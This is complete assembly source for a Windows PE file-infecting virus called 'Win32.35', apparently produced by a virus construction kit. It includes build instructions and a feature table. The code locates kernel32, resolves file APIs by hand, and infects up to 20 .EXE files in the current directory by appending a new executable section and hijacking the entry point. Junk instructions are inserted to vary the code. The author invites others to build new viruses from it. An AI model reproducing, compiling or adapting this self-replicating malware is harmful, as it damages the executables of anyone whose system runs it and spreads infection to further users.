              
;
;
; Win32.35 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.35
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 35
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 38
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 4420 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
                                        ; mov ebp, ecx
                                        ; clear ebp
 xor ebp, ebp
 add ebp, ecx
 sub ebp, offset Delta
 sal edx, 10d                           ; Trash
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg ecx, edx

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 push 128d
 pop ecx
 push ecx
 lea edx, [ebp+WFD_szFileName]


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
                                        ; clear edx
 mov edx, -34637d
 add edx, 34637d
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov eax, 53740
 mov eax, ( 53740d + 37d )
 sub eax, 37d
 cmp eax, 53740d
 je Notagoodfile

Goodfile:
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [edi+3Ch]
 cmp ecx, 0
 je Notagoodfile
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 add eax, edi
 sal ebx, 1d                            ; Trash
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], '35'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for DLL
 mov bx, word ptr [eax+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
 mov ecx, dword ptr [ebp+Attributes]
 push ecx
 lea esi, [ebp+WFD_szFileName]
 xchg ecx, esi

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; get File Alignment
 mov ebx, [edx+3Ch]
 mov dword ptr [ebp+filealign], ebx
                                        ; mov esi, -1
 mov esi, ( -1d xor 12d )
 xor esi, 12d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 xor dword ptr [ebp+PEheader], eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [eax+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov edx, dword ptr [eax+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], edx
 mov edx, [eax+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ebx, [eax+74h]
 shl ebx, 3
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [eax+6h]
 mov edi, 28h
 pushad
 mov eax, ecx
 mul edi
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 2d )
 xor ecx, 2d
 and ecx, dword ptr [ebp+Misc1]
 add eax, 78h
 add eax, ebx
 add eax, ecx
 lea ebx, [ebp+newsection]
 xchg ebx, edx


 xchg edx, eax
 push edx
                                        ; Calculate the RVA of the new section
 mov eax, [edx-5*8+8d]
 add eax, [edx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 push eax
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], eax
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], eax
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ecx,[edx-5*8+20d]
 add ecx,[edx-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ecx
 push eax
 pop dword ptr [ebp+AlignReg2]
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop ecx
 mov eax, edx
 push ecx
 neg edx                                ; Trash
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 adc ebx, 49734602d                     ; Trash
 pushad
 Call UnMapFile2
 popad
 push eax
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 pop edi
 lea eax, [ebp+newsection]
 xchg eax, ebx

                                        ; mov ecx, 16
 mov ecx, 16d
WriteNewSectionLoop:
 push dword ptr [ebx]
 pop dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
                                        ; add ebx, 4
 add ebx, 4d
 loop WriteNewSectionLoop
                                        ; increase section numbers
 mov ecx, dword ptr [ebp+PEheader]
 sub word ptr [ecx+06h], -1
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ecx+28h], edx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], 0h
 sub dword ptr [ebp+Trash1], 1336297    ; Trash
 add dword ptr [ecx+4Ch], '35'
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 mov ecx, VirusSize
 lea edx, [ebp+Virus]
 xchg esi, edx

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ebx
 add ebx, -1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edx
 dec esp
 sub esp, 3d
                                        ; round to pages
 shr edx, 16d
 shl edx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 7160
 sub dword ptr [ebp+K32Trys], 160d

GK1:                                    ; check for DOS-EXE Stub
                                        ; clear ebx
 mov ebx, 52748d
 sub ebx, 52748d
 xor ebx, dword ptr [ebp+K32Trys]
 cmp ebx, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 movzx eax, word ptr [edx]
 cmp eax, 'ZM'
 je CheckPE

GK2:
 add edx, -65536d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add edx, 60
 inc edx
 add edx, 59d
 mov edi, [edx]
 sub edx, 60d
 add edi, edx
                                        ; check for EP
 movzx ebx, word ptr [edi]
 sub ebx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edi, 22
 dec edi
 add edi, 23d
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [edi]
 dec dword ptr [ebp+Trash1]             ; Trash
 and cx, 0F000h
 cmp cx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 add edi, -22d


KernelFound:
 mov dword ptr [ebp+KernelPE], edi
 mov dword ptr [ebp+KernelMZ], edx

 jmp GetApis

;                  [ ///// * Data * \\\\\ ]

Data:
 PEheader    dd 0h

 FindHandle  dd 0h
 counter     dw 0h
 TempAPI     dd 0h
 KernelMZ    dd 0h
 ATableVA    dd 0h
 NewSize     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableTemp  dd 0h
 MapHandle   dd 0h
 Trash2      dd 0h
 InfCounter  dd 0h
 K32Trys     dd 0h
 NTableVA    dd 0h
 OldBase     dd 400000h
 OldEIP      dd 0h
 db 'Win32.35 created by SnakeByte',0

 APINames:
 db 13d, 'MapViewOfFile'
 db 11d, 'CreateFileA'
 db 13d, 'FindNextFileA'
 db 18d, 'GetFileAttributesA'
 db 18d, 'SetFileAttributesA'
 db 14d, 'FindFirstFileA'
 db 11d, 'CloseHandle'
 db 15d, 'UnmapViewOfFile'
 db 09d, 'FindClose'
 db 18d, 'CreateFileMappingA'


 APIOffsets:
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h

 MapAddress  dd 0h
 filemask    db '*.EXe',0
 AlignReg1   dd 0h
 filealign   dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FileHandle  dd 0h
 Attributes  dd 0h
 sectionalign   dd 0h
 Misc1       dd 0h
 AlignReg2   dd 0h
 OTableVA    dd 0h
 Trash1      dd 0h
 NewEIP      dd 0h
 TempApisearch1 dd 0h
 KernelPE    dd 0h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -42d
 add edx, 42d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov ebx, 20
 mov ebx, ( 20d xor 13d )
 xor ebx, 13d
 mov dword ptr [ebp+InfCounter], ebx
 mov eax, ebp
 add eax, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
                                        ; add edx, 1
 inc edx
 sub edx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; clear edx
 mov edx, -55568d
 add edx, 55568d
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 xor ecx, ecx
 add ecx, [edx+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
                                        ; get OTableVA
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
                                        ; number of API's we're looking for
                                        ; clear edx
 and edx, 0
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg esi, eax

 lea ecx, [ebp+APINames]


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; clear eax
 mov eax, 5382d
 sub eax, 5382d
 mov al, byte ptr [ecx]
                                        ; add ecx, 1
 inc ecx

                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; ecx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 push ecx
 add dword ptr [esp], eax
 pop ecx
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], ebx
                                        ; add esi, 4
 add esi, 4d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; ecx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], edx
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
                                        ; mov edx, ebx
                                        ; clear edx
 xor edx, edx
 add edx, ebx
                                        ; mov edi, ebx
                                        ; clear edi
 xor edi, edi
 add edi, ebx
 mov dword ptr [ebp+TempApisearch1], eax
 push edi
 push ecx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bl, byte ptr [edi]
 cmp bl, byte ptr [ecx]
 jne ApiNotFound
 dec eax
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz FoundApi1
                                        ; add ecx, 1
 inc ecx
                                        ; add edi, 1
 sub edi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ecx
 pop edi
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+TempApisearch1]
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+NTableTemp]
                                        ; add edx, 4
 dec edx
 add edx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
 pop ecx
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, ebx
 movzx edx, word ptr [ebx]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], 0
 xor dword ptr [ebp+Trash2], edi

 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 push edx
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ebx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, 276d
 mov eax, ebp
 add eax, offset WFD_szFileName


ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 add eax, 1d
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, offset WIN32_FIND_DATA
 add edx, ebp

 push edx
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, eax

 push eax
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
                                        ; clear edx
 mov edx, -42859d
 add edx, 42859d
 push ebx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 shr ecx, 18d                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, 19716d
 sub ecx, 19716d
 push ecx
 call ExitProcess



end FakeCode

